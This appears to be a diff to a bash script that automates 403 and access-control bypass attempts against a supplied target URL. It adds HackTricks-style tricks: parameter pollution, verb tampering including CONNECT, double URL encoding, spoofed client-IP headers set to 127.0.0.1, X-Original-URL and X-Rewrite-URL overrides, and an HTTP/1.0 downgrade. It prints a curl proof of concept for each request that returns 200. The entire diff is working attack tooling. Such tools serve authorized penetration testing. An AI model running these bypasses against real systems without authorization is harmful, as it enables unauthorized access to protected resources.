@@ -36,13 +36,31 @@ req() {
 
     HITS=$((HITS + 1))
 
+    local method="GET"
     local poc="curl -s -i -L"
-    for a in "$@"; do
-        poc+=" $(printf '%q' "$a")"
+    local args=("$@")
+    local i=0
+    while [ $i -lt ${#args[@]} ]; do
+        local a="${args[$i]}"
+        case "$a" in
+        -X)
+            method="${args[$((i + 1))]}"
+            poc+=" -X ${args[$((i + 1))]}"
+            i=$((i + 2))
+            ;;
+        -H | -A)
+            poc+=" ${a} \"${args[$((i + 1))]}\""
+            i=$((i + 2))
+            ;;
+        *)
+            poc+=" ${a}"
+            i=$((i + 1))
+            ;;
+        esac
     done
-    poc+=" $(printf '%q' "$url")"
+    poc+=" \"${url}\""
 
-    echo -e "${GREEN}${BOLD}[$HITS] 200 OK${RESET}  ${DIM}(${size} bytes)${RESET}"
+    echo -e "${GREEN}${BOLD}[$HITS] 200 OK${RESET}  ${DIM}(${size} bytes, ${method})${RESET}"
     echo -e "    ${label}"
     echo -e "    ${CYAN}${poc}${RESET}"
     echo ""
@@ -81,6 +99,13 @@ req "$TARGET/$PATHV/.random" "${TARGET}/${PATHV}/.random"
 req "$TARGET/${PATHV}..;/" "${TARGET}/${PATHV}..;/"
 req "$TARGET/${PATHV};/" "${TARGET}/${PATHV};/"
 
+# Parameter pollution — duplicate params to confuse protection logic
+req "$TARGET/${PATHV}&id=1" "${TARGET}/${PATHV}&id=1"
+req "$TARGET/${PATHV}&id=admin" "${TARGET}/${PATHV}&id=admin"
+req "$TARGET/${PATHV}&id[]=123" "${TARGET}/${PATHV}&id[]=123"
+req "$TARGET/${PATHV}&id=123&id=1" "${TARGET}/${PATHV}&id=123&id=1"
+req "$TARGET/${PATHV}&id=123&id=admin" "${TARGET}/${PATHV}&id=123&id=admin"
+
 # --- HackTricks additions ---
 
 # Path case / suffix / separator tricks
@@ -92,18 +117,35 @@ req "$TARGET/${PATHV}.json" "${TARGET}/${PATHV}.json"
 req "$TARGET/%ef%bc%8f$PATHV" "${TARGET}/%ef%bc%8f${PATHV} (unicode fullwidth slash)"
 
 # Verb tampering — a route protected on GET may allow other verbs
-for VERB in HEAD POST PUT DELETE OPTIONS TRACE PATCH INVENTED HACK; do
+for VERB in HEAD POST PUT DELETE CONNECT OPTIONS TRACE PATCH INVENTED HACK; do
     req "$TARGET/$PATHV" "${TARGET}/${PATHV} -X ${VERB}" -X "$VERB"
 done
 req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H X-HTTP-Method-Override: PUT" -H "X-HTTP-Method-Override: PUT"
+
+# Double URL-encoded path bypass
+req "$TARGET/%252e/$PATHV" "${TARGET}/%252e/${PATHV} (double URL encode)"
 
 # Host header tricks
 req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H Host: (removed)" -H "Host;"
 req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H Host: localhost" -H "Host: localhost"
 req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H Host: 127.0.0.1" -H "Host: 127.0.0.1"
 
+# IP-spoofing header fuzzing (full HackTricks list)
+for HDR in X-Originating-IP X-Forwarded-For X-Forwarded Forwarded-For \
+    X-Remote-IP X-Remote-Addr X-ProxyUser-Ip Client-IP \
+    True-Client-IP Cluster-Client-IP; do
+    req "$TARGET/$PATHV" "${TARGET}/${PATHV} -H ${HDR}: 127.0.0.1" -H "${HDR}: 127.0.0.1"
+done
+
+# X-Original-URL / X-Rewrite-URL path bypass (protected path via header instead of URL)
+req "$TARGET/" "${TARGET}/ -H X-Original-URL: /${PATHV}" -H "X-Original-URL: /$PATHV"
+req "$TARGET/" "${TARGET}/ -H X-Rewrite-URL: /${PATHV}" -H "X-Rewrite-URL: /$PATHV"
+
 # User-Agent variation — some WAF/ACL rules key off UA
 req "$TARGET/$PATHV" "${TARGET}/${PATHV} -A googlebot" -A "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
 req "$TARGET/$PATHV" "${TARGET}/${PATHV} -A curl-empty" -A ""
+
+# Protocol version downgrade
+req "$TARGET/$PATHV" "${TARGET}/${PATHV} --http1.0" --http1.0
 
 echo -e "${BOLD}Done.${RESET} ${GREEN}${HITS}${RESET} bypass(es) returned 200."
